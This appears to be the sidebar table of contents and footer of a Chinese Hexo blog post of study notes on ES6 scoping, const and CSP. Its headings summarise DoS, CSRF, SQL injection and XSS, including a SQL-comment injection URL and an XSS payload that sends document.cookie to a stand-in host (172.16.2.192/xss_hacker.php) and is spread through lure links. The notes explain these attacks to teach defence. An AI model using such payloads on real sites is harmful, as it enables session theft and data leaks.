          <p class="site-description motion-element" itemprop="description">东京食尸鬼啥时候出续集啊</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">14</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">9</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#let"><span class="nav-number">1.</span> <span class="nav-text">let</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#let-用来声明的对象只在let命令所在的代码块内有效"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">let 用来声明的对象只在let命令所在的代码块内有效</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">例如</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。"><span class="nav-number">1.0.0.2.1.</span> <span class="nav-text">此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。"><span class="nav-number">1.0.0.2.2.</span> <span class="nav-text">上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#let用来声明的对象不存在变量提升的情况，例如"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">let用来声明的对象不存在变量提升的情况，例如</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#此时代码会报错，因此使用let时必须先声明后调用"><span class="nav-number">1.0.0.3.1.</span> <span class="nav-text">此时代码会报错，因此使用let时必须先声明后调用</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#相同作用域内，不允许重复声明变量"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">相同作用域内，不允许重复声明变量</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#此处高能开始，块级作用域与函数声明"><span class="nav-number">1.0.1.</span> <span class="nav-text">此处高能开始，块级作用域与函数声明</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ES5-规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6-引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面代码在-ES5-中运行，会得到“I-am-inside-”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">上面代码在 ES5 中运行，会得到“I am inside!”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ES6-的运行结果就完全不一样了，会得到“I-am-outside-”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">ES6 的运行结果就完全不一样了，会得到“I am outside!”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？"><span class="nav-number">1.0.1.0.4.</span> <span class="nav-text">但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#原来，ES6-改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。"><span class="nav-number">1.0.1.0.5.</span> <span class="nav-text">原来，ES6 改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意，上面三条规则只对-ES6-的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。"><span class="nav-number">1.0.1.0.6.</span> <span class="nav-text">注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据这三条规则，在浏览器的-ES6-环境中，块级作用域内声明的函数，行为类似于var声明的变量。"><span class="nav-number">1.0.1.0.7.</span> <span class="nav-text">根据这三条规则，在浏览器的 ES6 环境中，块级作用域内声明的函数，行为类似于var声明的变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实际的运行结果类似这样"><span class="nav-number">1.0.1.0.8.</span> <span class="nav-text">实际的运行结果类似这样</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。"><span class="nav-number">1.0.1.0.9.</span> <span class="nav-text">考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#do表达式"><span class="nav-number">2.</span> <span class="nav-text">do表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">==经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用==</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#const命令"><span class="nav-number">3.</span> <span class="nav-text">const命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。"><span class="nav-number">3.0.0.1.</span> <span class="nav-text">const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。"><span class="nav-number">3.0.0.1.1.</span> <span class="nav-text">上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果想要将对象彻底冻结，则需要将其属性全部冻结。"><span class="nav-number">3.0.0.1.2.</span> <span class="nav-text">如果想要将对象彻底冻结，则需要将其属性全部冻结。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是一个完全冻结对象的函数"><span class="nav-number">3.0.0.1.3.</span> <span class="nav-text">下面是一个完全冻结对象的函数</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#顶层对象的属性"><span class="nav-number">3.0.0.2.</span> <span class="nav-text">顶层对象的属性</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。"><span class="nav-number">3.0.0.2.1.</span> <span class="nav-text">顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。"><span class="nav-number">3.0.0.2.2.</span> <span class="nav-text">顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。"><span class="nav-number">3.0.0.2.3.</span> <span class="nav-text">ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#global-对象"><span class="nav-number">3.0.0.3.</span> <span class="nav-text">global 对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Worker"><span class="nav-number">3.0.0.4.</span> <span class="nav-text">Web Worker</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#当在-HTML-页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。"><span class="nav-number">3.0.0.4.1.</span> <span class="nav-text">当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#web-worker-是运行在后台的-JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时-web-worker-在后台运行。"><span class="nav-number">3.0.0.4.2.</span> <span class="nav-text">web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#既然是这样的话，那我感觉短时间内应该是用不到它了。"><span class="nav-number">3.0.0.5.</span> <span class="nav-text">既然是这样的话，那我感觉短时间内应该是用不到它了。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。"><span class="nav-number">3.0.0.5.1.</span> <span class="nav-text">同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。"><span class="nav-number">3.0.0.5.2.</span> <span class="nav-text">综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system-global模拟了这个提案，可以在所有环境拿到global。"><span class="nav-number">3.0.0.5.3.</span> <span class="nav-text">现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system.global模拟了这个提案，可以在所有环境拿到global。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面代码可以保证各种环境里面，global对象都是存在的。"><span class="nav-number">3.0.0.5.4.</span> <span class="nav-text">上面代码可以保证各种环境里面，global对象都是存在的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面代码将顶层对象放入变量global。"><span class="nav-number">3.0.0.5.5.</span> <span class="nav-text">上面代码将顶层对象放入变量global。</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP和XXS-CSRF"><span class="nav-number">4.</span> <span class="nav-text">CSP和XXS,CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CSP（内容安全策略）"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">CSP（内容安全策略）</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。"><span class="nav-number">4.0.0.1.1.</span> <span class="nav-text">为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#首先列举常见的web攻击方式"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">首先列举常见的web攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。"><span class="nav-number">4.0.0.2.1.</span> <span class="nav-text">是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。"><span class="nav-number">4.0.0.2.2.</span> <span class="nav-text">是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。"><span class="nav-number">4.0.0.2.3.</span> <span class="nav-text">一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。"><span class="nav-number">4.0.0.2.4.</span> <span class="nav-text">是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。"><span class="nav-number">4.0.0.2.5.</span> <span class="nav-text">　　SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SQL注入常见个例子："><span class="nav-number">4.0.0.2.6.</span> <span class="nav-text">　　SQL注入常见个例子：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#私密信息泄露"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">　　私密信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www-book-com-serach-echo"><span class="nav-number">4.0.0.3.1.</span> <span class="nav-text">　　　　　　　假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www.book.com?serach=echo</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#完成此功能的SQL语句为简单的根据条件查找：select-from-book-where-author-‘echo’-and-flag-1-flag等于1代表书籍已出版。"><span class="nav-number">4.0.0.3.2.</span> <span class="nav-text">　　　　　　　完成此功能的SQL语句为简单的根据条件查找：select * from book where author = ‘echo’ and flag = 1; flag等于1代表书籍已出版。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这时如果有的用户直接地址栏里输入www-book-com-serach-echo’–-这样请求会发生什么？？"><span class="nav-number">4.0.0.3.3.</span> <span class="nav-text">　　　　　　　这时如果有的用户直接地址栏里输入www.book.com?serach=echo’–   这样请求会发生什么？？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这样的请求传到服务器里的状态会是这样子的-select-from-book-where-author-‘echo’-–-and-flag-1-在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。"><span class="nav-number">4.0.0.3.4.</span> <span class="nav-text">　　　　　　　这样的请求传到服务器里的状态会是这样子的 select * from book where author = ‘echo’ – and flag = 1;在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。"><span class="nav-number">4.0.0.3.5.</span> <span class="nav-text">　跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解"><span class="nav-number">4.0.0.4.</span> <span class="nav-text">所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入alert-‘xss’-会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。"><span class="nav-number">4.0.0.4.1.</span> <span class="nav-text">这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入alert(‘xss’)会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入alert-‘xss’-，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”-gt-alert-‘xss’-输入进去，这样会造成什么样的结果，我们可以看下代码"><span class="nav-number">4.0.0.4.2.</span> <span class="nav-text">这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入alert(‘xss’)，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”>alert(‘xss’)输入进去，这样会造成什么样的结果，我们可以看下代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#是不是恍然大悟。因此如果我们把”-gt-alert-‘xss’-换成一段用于获取用户cookie的代码，例如”-gt-window-open-“http-172-16-2-192-xss-hacker-php-cookie-quot-document-cookie-lt-–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。"><span class="nav-number">4.0.0.4.3.</span> <span class="nav-text">是不是恍然大悟。因此如果我们把”>alert(‘xss’)换成一段用于获取用户cookie的代码，例如”/> window.open(“<a href="http://172.16.2.192/xss_hacker.php?cookie=&quot;+document.cookie">http://172.16.2.192/xss_hacker.php?cookie=&quot;+document.cookie</a>);<!–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。"><span class="nav-number">4.0.0.4.4.</span> <span class="nav-text">那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#再次回到CSP"><span class="nav-number">4.0.0.5.</span> <span class="nav-text">再次回到CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章"><span class="nav-number">4.0.0.5.1.</span> <span class="nav-text">csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ShengNan</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"wanzhuhao"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>

  
    
    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
    <script src="/js/src/hook-duoshuo.js"></script>
  






  
  

  

  

  

</body>
</html>
